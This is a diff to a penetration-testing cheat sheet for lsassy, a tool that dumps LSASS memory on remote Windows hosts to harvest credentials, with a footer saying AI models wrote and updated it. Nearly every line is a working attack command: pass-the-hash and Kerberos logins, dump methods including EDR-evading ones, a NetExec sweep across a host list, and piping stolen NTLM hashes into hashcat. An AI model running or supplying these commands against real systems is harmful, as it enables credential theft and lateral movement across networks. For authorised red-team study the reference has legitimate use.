@@ -28,11 +28,11 @@ lsassy -d DOMAIN -u Administrator -H :NTLMhash 192.168.1.10
 # Kerberos (ccache)
 KRB5CCNAME=admin.ccache lsassy -k dc01.domain.local
 
-# Multiple targets
+# Multiple targets (positional, space-separated — there is no -f targets-file flag; -f is --format)
 lsassy -d DOMAIN -u Administrator -p Password 192.168.1.10 192.168.1.20 192.168.1.30
 
-# Target from file
-lsassy -d DOMAIN -u Administrator -p Password -f hosts.txt
+# For a host LIST / subnet sweep, drive it through the NetExec module instead
+netexec smb hosts.txt -u Administrator -p Password -M lsassy
 ```
 
 ---
@@ -48,9 +48,8 @@ lsassy -d DOMAIN -u user -p Password 192.168.1.10 -m procdump
 lsassy -d DOMAIN -u user -p Password 192.168.1.10 -m nanodump
 lsassy -d DOMAIN -u user -p Password 192.168.1.10 -m edrsandblast
 lsassy -d DOMAIN -u user -p Password 192.168.1.10 -m dumpert
-
-# List all available methods
-lsassy --methods
+# (-m is --dump-method. There's no --methods list flag; the method set is the
+#  table below — plus mirrordump, ppldump, dllinject, silentprocessexit, rawrpc, …)
 ```
 
 | Method | Notes |
@@ -68,18 +67,18 @@ lsassy --methods
 
 ## Output Options
 
+> [!warning] **`-o` and `-f` are the opposite of what older guides show.** `-f/--format` sets the FORMAT (`pretty` default, `json`, `grep`, `table`); `-o/--outfile` writes to a FILE. `-O` is `--options` (dump-method options), **not** an output file.
+
 ```bash
-# Default — print to console
+# Default — pretty print to console
 lsassy -d DOMAIN -u user -p Password 192.168.1.10
 
-# Output as JSON
-lsassy -d DOMAIN -u user -p Password 192.168.1.10 -o json -O /tmp/creds.json
+# JSON to a file
+lsassy -d DOMAIN -u user -p Password 192.168.1.10 -f json -o /tmp/creds.json
 
-# Output as Grep-friendly
-lsassy -d DOMAIN -u user -p Password 192.168.1.10 -o grep
-
-# Output as table
-lsassy -d DOMAIN -u user -p Password 192.168.1.10 -o table
+# Grep-friendly / table to console
+lsassy -d DOMAIN -u user -p Password 192.168.1.10 -f grep
+lsassy -d DOMAIN -u user -p Password 192.168.1.10 -f table
 ```
 
 ---
@@ -118,8 +117,11 @@ lsassy -d DOMAIN -u user -p Password 192.168.1.10 --keep-dump
 # Specify where to write the dump on the target
 lsassy -d DOMAIN -u user -p Password 192.168.1.10 --dump-path C:\\Windows\\Temp --dump-name lsass.dmp
 
-# Parse a pre-existing dump file (already on the target)
-lsassy -d DOMAIN -u user -p Password 192.168.1.10 --dump-path C:\\Windows\\Temp --dump-name existing.dmp --no-dump
+# Parse a pre-existing dump already on the target (flag is --parse-only, not --no-dump)
+lsassy -d DOMAIN -u user -p Password 192.168.1.10 --dump-path C:\\Windows\\Temp --dump-name existing.dmp --parse-only
+
+# Dump only, don't parse (grab the .dmp for offline pypykatz)
+lsassy -d DOMAIN -u user -p Password 192.168.1.10 --dump-only --keep-dump
 ```
 
 ---
@@ -128,11 +130,11 @@ lsassy -d DOMAIN -u user -p Password 192.168.1.10 --dump-path C:\\Windows\\Temp 
 
 ```bash
 # lsassy outputs in format: domain\user NT:hash
-# Extract just hashes for hashcat
-lsassy -d DOMAIN -u user -p Password 192.168.1.10 -o grep | grep -oP '[0-9a-f]{32}' | sort -u > ntlm.txt
+# Extract just hashes for hashcat (-f grep for the grep-friendly format)
+lsassy -d DOMAIN -u user -p Password 192.168.1.10 -f grep | grep -oP '[0-9a-f]{32}' | sort -u > ntlm.txt
 
 # Feed directly to hashcat
-lsassy -d DOMAIN -u user -p Password 192.168.1.0/24 -o grep | \
+lsassy -d DOMAIN -u user -p Password 192.168.1.10 -f grep | \
   grep -oP '[0-9a-f]{32}' | sort -u | \
   hashcat -m 1000 - /usr/share/wordlists/rockyou.txt
 ```
@@ -149,6 +151,10 @@ lsassy -d DOMAIN -u user -p Password 192.168.1.0/24 -o grep | \
 
 ---
 
+> [!note] **See also** — pairs with [[Tools/Credential Dumping/secretsdump|secretsdump]] (SAM/LSA/NTDS via DRSUAPI vs live LSASS here); drive host sweeps and the `-M lsassy` module through [[Tools/Lateral Movement/NetExec|NetExec]]; the DPAPI-secrets remote-loot counterpart is [[Tools/Credential Dumping/DonPAPI|DonPAPI]].
+
+---
+
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-27*
+*Model: claude-opus-5*
